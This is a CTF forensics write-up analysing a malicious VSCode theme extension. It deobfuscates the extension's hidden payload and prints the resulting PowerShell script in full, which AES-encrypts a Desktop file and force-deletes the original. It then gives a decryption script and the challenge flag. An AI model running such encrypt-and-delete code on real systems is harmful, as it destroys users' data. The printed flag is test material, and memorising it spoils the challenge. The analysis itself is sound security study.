---
title: bitsCTF - Forensics - Virus Camp 2
date: 2025-02-12 12:00:00 +0100
categories: [CTFs, bitsCTF]
tags: [ctfs, bitsCTF, forensics]
description: A light theme with dark intentions.
author: <author_id>

image:
  path: /assets/img/bitsCTF/bitsCTF.jpg
---

## Challenge description 

> Can you now get the contents of the flag as well?
>
> *Find the flag.*
{: .prompt-info }

**Flag : BITSCTF{hOpe_yOu_enjOyed_th1s_145e3f1a}**

## Ressources

For this challenge, we will be using the same `.ad1` disk image from the first [Virus Camp](https://emree-1.github.io/posts/bitskrieg-virus-camp1) challenge.

## Tools 

To examine the `.ad1` disk image, we will be using `FTK Imager`. However, the key tool we will need for this challenge is a good understanding of `PowerShell`.

## Resolution

### Initial Analysis 

If you recall from the [Virus Camp 1](https://emree-1.github.io/posts/bitskrieg-virus-camp1) challenge, we discovered a flag hidden in a comment within a JavaScript file named `extension.js`. Alice had installed it, believing it was a light theme for VSCode, and we stopped our analysis there. We didn’t look into the functionality of the script in detail at the time, but now it’s time to dive deeper into its core logic!

Upon examining the `extension.js` file, we immediately notice a variable named `scriptContent`. This variable appears to contain base64-encoded data, but attempts to decode it fail. This suggests that some obfuscation techniques have been applied to make it harder to retrieve the original script.

### Deobfuscating `scriptContent`

Fortunately, the deobfuscation logic is present right after the encoded content. It appears that the characters in the string have been reversed—meaning the last character should be the first, the second-to-last should be the second, and so on. To retrieve the original content, we simply need to reverse the string and then decode it from Base64.

Here’s a small Python script to handle the deobfuscation:

```py
import base64

obfuscated = "K0QZjJ3bG1CIlxWaGRXdw5WakASblRX..."
reversed = obfuscated[::-1]
decoded = base64.b64decode(reversed)
result = decoded.decode()
print(result)
```

### Understanding the PowerShell Script

After reversing the string and decoding it from Base64, we obtain a PowerShell script. Let’s analyze its content to understand its purpose.

```powershell
$password = "MyS3cr3tP4ssw0rd"
$salt = [Byte[]](0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08)
$iterations = 10000
$keySize = 32
$ivSize = 16

$deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
$key = $deriveBytes.GetBytes($keySize)
$iv = $deriveBytes.GetBytes($ivSize)

$inputFile = "C:\\Users\\vboxuser\\Desktop\\flag.png"
$outputFile = "C:\\Users\\vboxuser\\Desktop\\flag.enc"

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

$encryptor = $aes.CreateEncryptor()

$plainBytes = [System.IO.File]::ReadAllBytes($inputFile)

$outStream = New-Object System.IO.FileStream($outputFile, [System.IO.FileMode]::Create)
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

$cryptoStream.Write($plainBytes, 0, $plainBytes.Length)
$cryptoStream.FlushFinalBlock()

$cryptoStream.Close()
$outStream.Close()

Remove-Item $inputFile -Force
```


Here’s a quick breakdown of what this script does:
1. **Setting up encryption parameters**:
   - *Password*: `"MyS3cr3tP4ssw0rd"`.
   - *Salt*: 0x01, `0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08`.
   - *Iterations*: `10,000`.
   - Uses `Rfc2898DeriveBytes()` to derive a key and IV based on the password, salt, and number of iterations.
2. **Configuring AES encryption**: uses AES with the derived key and IV. Operates in `CBC (Cipher Block Chaining)` mode with `PKCS7` padding to encrypt a file.
3. **Reading the input file**: reads `flag.png` from `C:\Users\vboxuser\Desktop\flag.png`.
4. **Encrypting the file**: encrypts the input file using AES.
5. **Saving the encrypted file**: stores the encrypted output as `C:\Users\vboxuser\Desktop\flag.enc`.

From this script, we can infer that Alice originally had a file named `flag.png` on her Desktop. However, when the malicious VSCode extension executed, it encrypted the file and replaced it with `flag.enc`, an encrypted version of the flag.

## Reversing the PowerShell Script

Fortunately for us, the password and salt used to derive the AES key and IV are hardcoded into the script, which allows us to reverse the encryption process.

To recover the original flag, we will:
1. Recreate the AES decryption object using the parameters found in the malicious script.
2. Decrypt flag.enc to restore `flag.png`.

Here’s a PowerShell script to do that:

```powershell
$password = "MyS3cr3tP4ssw0rd"
$salt = [Byte[]](0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08)
$iterations = 10000
$keySize = 32   
$ivSize = 16 

$deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
$key = $deriveBytes.GetBytes($keySize)
$iv = $deriveBytes.GetBytes($ivSize)

$inputFile = "C:\\Users\\vboxuser\\Desktop\\flag.enc"
$outputFile = "C:\\Users\\vboxuser\\Desktop\\flag.png"

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

$decryptor = $aes.CreateDecryptor() # Decryptor instead of Encryptor

$inStream = New-Object System.IO.FileStream($inputFile, [System.IO.FileMode]::Open)
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($inStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)

$outStream = New-Object System.IO.FileStream($outputFile, [System.IO.FileMode]::Create)

$buffer = New-Object byte[] 4096
while (($bytesRead = $cryptoStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
    $outStream.Write($buffer, 0, $bytesRead)
}

$cryptoStream.Close()
$outStream.Close()
$inStream.Close()
```

After executing this script, we successfully recover the following image file, which contains the flag:

![...](assets/img/bitsCTF/forensics/virus-camp2/flag.png){: w="400"}

## Conclusion

I wasn’t able to complete the `Virus Camp challenges` during the event, but I kept working on them afterward, and I’m glad I finally managed to solve them. This challenge was a great opportunity to learn more about how malicious actors can infect a system—even through applications that most users would consider trustworthy.

Thank you for reading my write-up! See you in the next one! 

*emree1*
